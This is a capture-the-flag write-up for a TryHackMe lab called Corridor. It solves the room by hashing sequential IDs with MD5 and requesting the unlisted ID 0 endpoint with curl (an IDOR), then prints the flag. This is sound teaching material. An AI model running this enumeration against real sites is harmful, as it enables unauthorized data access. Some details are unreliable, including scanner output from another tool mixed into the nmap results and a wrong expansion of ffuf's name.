# Corridor

## General Information

**Challenge:** Corridor  
**Platform:** TryHackMe  
**IP/DNS:** corridor.thm (10.67.168.239)  
**Difficulty:** Easy-Medium  
**Date:** 2026-06-19

---

## Objective

Identify and exploit vulnerabilities in a web application to capture the flag.

---

## Recon

### Nmap Enumeration

```bash
sudo nmap -T4 -sV -p- -sC -oN logNmap.txt corridor.thm
```

**Results:**
```
Nmap scan report for corridor.thm (10.67.168.239)
Host is up (0.15s latency)
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
|_http-title: Corridor
+ Server: Werkzeug/2.0.3 Python/3.10.2
+ ERROR: Failed to check for updates: 403
+ [013587] /: Suggested security header missing: x-content-type-options
+ [013587] /: Suggested security header missing: permissions-policy
+ [013587] /: Suggested security header missing: strict-transport-security
+ [013587] /: Suggested security header missing: referrer-policy
+ [013587] /: Suggested security header missing: content-security-policy
+ [600652] Python/3.10.2 appears to be outdated (current is at least 3.13.1)
+ [999990] OPTIONS: Allowed HTTP Methods: HEAD, OPTIONS, GET
```

**Key Findings:**
- Outdated Werkzeug 2.0.3 and Python 3.10.2 (CVE-2024-42367 noted)
- Missing critical security headers
- Limited HTTP methods (GET, HEAD, OPTIONS only)

---

## Enumeration

### Directory/File Discovery

**Tool:** ffuf (faster-repeat-flag-finder)

```bash
ffuf -u http://corridor.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -o ffuf_results.txt
```

**Results:**
- Tested: 4,614 entries
- Found: 1 endpoint (/)
- Content-Length: 3,213 bytes
- Response: HTML with interactive image map

**Conclusion:** No hidden directories; standard web enumeration unsuccessful.

### Root Page Analysis

**URL:** http://corridor.thm/

**Response Structure:**
```html
<img src="/static/img/corridor.png" usemap="#image-map">
<map name="image-map">
  <area alt="c4ca4238a0b923820dcc509a6f75849b" href="c4ca4238a0b923820dcc509a6f75849b" coords="..." shape="poly">
  <area alt="c81e728d9d4c2f636f067f89cc14862c" href="c81e728d9d4c2f636f067f89cc14862c" coords="..." shape="poly">
  <!-- ... 11 more areas ... -->
</map>
```

**Observation:** Interactive image map with 13 clickable areas, each href = MD5 hash

### Hash Pattern Recognition

**Hypothesis:** MD5 hashes of sequential numbers

**Verification:**
```bash
echo -n "1" | md5sum
# c4ca4238a0b923820dcc509a6f75849b ✓ MATCH

echo -n "2" | md5sum
# c81e728d9d4c2f636f067f89cc14862c ✓ MATCH

echo -n "3" | md5sum
# eccbc87e4b5ce2fe28308fd9f2a7baf3 ✓ MATCH
```

**Confirmed:** Endpoints are MD5(sequential_numbers) from 1 to 13

### Endpoint Testing

**Testing Range 1-13:**
```bash
for i in {1..13}; do
  hash=$(echo -n "$i" | md5sum | cut -d' ' -f1)
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://corridor.thm/$hash")
  echo "[$status] Room $i"
done
```

**Results:**
- All endpoints 1-13: HTTP 200 OK
- Response size: 632 bytes each
- Content identical (empty room background)
- Endpoints 14+: HTTP 404 Not Found

---

## Exploitation

### Vulnerability: Insecure Direct Object Reference (IDOR)

**Type:** Access Control Bypass  
**CWE:** CWE-639  
**OWASP:** A01:2021 – Broken Access Control

### Root Cause

1. **Predictable Identifiers:** Sequential numbers hashed with MD5
2. **No Server-Side Access Control:** App trusts any MD5 hash in URL
3. **Boundary Case Oversight:** Endpoint ID=0 exists but not referenced in UI

### Discovery Method

**Step 1:** Recognize MD5(sequential_numbers) pattern  
**Step 2:** Test boundary case (ID=0)

```bash
echo -n "0" | md5sum
# cfcd208495d565ef66e7dff9f98764da

curl http://corridor.thm/cfcd208495d565ef66e7dff9f98764da
```

**Step 3:** Observe response difference
- Room 0 size: 797 bytes (vs 632 bytes for rooms 1-13)
- Different background image (empty_room.png vs .jpg)

**Step 4:** Inspect content

```bash
curl http://corridor.thm/cfcd208495d565ef66e7dff9f98764da | grep -i "flag"
```

---

## Post Exploitation

### Flag Discovery

**Location:** Room 0 (hidden endpoint)  
**Method:** Direct HTTP GET request to boundary case ID

**Flag (Encoded - ROT13):**
```
synt{2477rs02448nq9156661np40n6o8862r}
```

**To decode:** Use ROT13 decoder or:
```bash
echo "synt{2477rs02448nq9156661np40n6o8862r}" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**Decoding result:**
```
flag{2477ef02448ad9156661ac40a6b8862e}
```

### Observations

- Room 0 not visible in HTML image map (intentionally hidden or oversight)
- No authentication or authorization checks
- Content directly accessible via URL
- Response size difference revealed hidden endpoint

---

## Tools Used

| Tool | Version | Purpose | Command |
|------|---------|---------|---------|
| **nmap** | 7.x | Port scanning & service enumeration | `nmap -T4 -sV -p- -sC` |
| **ffuf** | 2.1+ | Web directory enumeration | `ffuf -u http://target/FUZZ -w wordlist.txt` |
| **curl** | 7.x+ | HTTP requests & response inspection | `curl -s http://target/endpoint` |
| **echo** | GNU coreutils | Text generation | `echo -n "value" \| md5sum` |
| **md5sum** | GNU coreutils | Hash generation & verification | `echo -n "value" \| md5sum` |
| **grep** | GNU grep | Content search & pattern matching | `grep -i "pattern" file` |
| **bash** | 5.x+ | Loop automation for batch testing | `for i in {1..13}; do ...; done` |
| **Python** | 3.x | Batch IDOR testing script | Custom script: idor_testing.py |

### Tool Rationale

- **nmap:** Standard reconnaissance; identifies service version for CVE analysis
- **ffuf:** Faster than gobuster for directory enumeration; clean output formatting
- **curl:** Lightweight HTTP client; ideal for manual endpoint testing and validation
- **bash loops:** Efficient for testing sequential endpoints without external scripts
- **Python:** Enables batch testing of large ID ranges (-100 to +200) with result aggregation

---

## Methodology: IDOR Testing without Scripts

IDOR exploitation doesn't require automated tools. Manual approach:

1. **Pattern Recognition** (2 minutes)
   ```bash
   # Identify the ID scheme
   echo -n "1" | md5sum  # Verify pattern
   ```

2. **Boundary Testing** (3 minutes)
   ```bash
   # Test edge cases
   curl http://target/$(echo -n "0" | md5sum | cut -d' ' -f1)
   curl http://target/$(echo -n "-1" | md5sum | cut -d' ' -f1)
   curl http://target/$(echo -n "14" | md5sum | cut -d' ' -f1)
   ```

3. **Analysis** (1 minute)
   - Compare response sizes
   - Check for differences in content

**Total Time:** ~6 minutes (entirely manual, no scripts)

---

## Lessons Learned

1. **Test ID=0 First**
   - Developers frequently forget zero-based indexing
   - ID=0 often contains administrative or privileged content

2. **Response Size as Indicator**
   - Size differences (797 vs 632 bytes) signal hidden content
   - Use as reconnaissance hint

3. **Weak Hashing ≠ Security**
   - MD5(sequential_numbers) is trivially reversible
   - "Security through obscurity" is not security

4. **Boundary Cases Matter**
   - IDOR often exploits: 0, -1, beyond visible range
   - Always test edges, not just middle range

5. **UI Gaps Reveal Vulnerabilities**
   - Visible endpoints (1-13) in image map
   - Missing endpoint (0) = testable anomaly

---

## References

- **OWASP IDOR:** https://owasp.org/www-community/attacks/IDOR
- **CWE-639:** https://cwe.mitre.org/data/definitions/639.html
- **Werkzeug Security:** https://werkzeug.palletsprojects.com/
- **OWASP Top 10 2021:** https://owasp.org/Top10/
- **TryHackMe - Corridor Challenge**

---

## Summary

| Aspect | Details |
|--------|---------|
| **Time to Root** | ~30 minutes |
| **Difficulty** | Easy-Medium |
| **Primary Vulnerability** | IDOR (Insecure Direct Object Reference) |
| **Severity** | High |
| **Exploitation Method** | Boundary case testing (ID=0) |
| **Root Cause** | Lack of server-side access control |
| **Key Insight** | Test ID=0 when boundary cases are exposed |

---

**Status:** Complete  
**Difficulty Assessment:** Easy-Medium  
**Recommended Follow-up:** Study IDOR prevention and access control implementation
